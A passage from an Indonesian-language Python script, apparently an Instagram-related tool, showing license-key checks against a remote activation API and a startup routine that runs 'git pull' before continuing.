       sleep(3) ; cetak(panel(f'''{P}[{H2}✓{P}] Silahkan Jalankan Ulang Scriptnya Dengan Ketik {O2}python IG_prem.py''',width=80,padding=(0,1),style=f"bold grey100"))

#----------------[ CHECK LISENSI AKTIF & NONAKTIF ]----------------#
   def ChekingLisensi(self):
       try:
           research = open("data/.LisensiLog.json","r").read()
       except FileNotFoundError as e:
           self.removeLisensi() ; self.pasteLisen()
       try:
           research = self.ses.get(f'''{self.url}/api/key/Activate?token={self.token}&ProductId={self.ProductId}&Key={research}''').json()['licenseKey']['key']
           sleep(3) ; Menu()
       except KeyError as e:
           cetak(panel(f'''{P}[{M2}!{P}] Opshhh Lisensi Yang Kamu Miliki Sudah Kedaluwarsa''',width=80,padding=(0,1),style=f"bold grey100"))
           self.removeLisensi() ; sleep(3) ; self.WhatsApp()

#----------------[CHEK LISENSI ]----------------#
   def Chekinn_(self):
       try:
           xcTeam = open("data/.LisensiLog.json","r").read()
       except FileNotFoundError as e : self.pasteLisen()
       self.clearTerminal()    ; self.ChekingLisensi()
       



#----------------[ SYSTEM CONTROL ]----------------#
def ha():
	try:
		__import__('os').system('git pull') ;  AssetAndKey()
	except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout) as e:
		__import__('os').system('clear') ; LicenseKey().Logou() ; Console().print(f'\n {P}[{M2}!{P}] ConnectionError : {M2}{str(e).title()}') ; time.sleep(3.1) ; sys.exit()
ha()
	

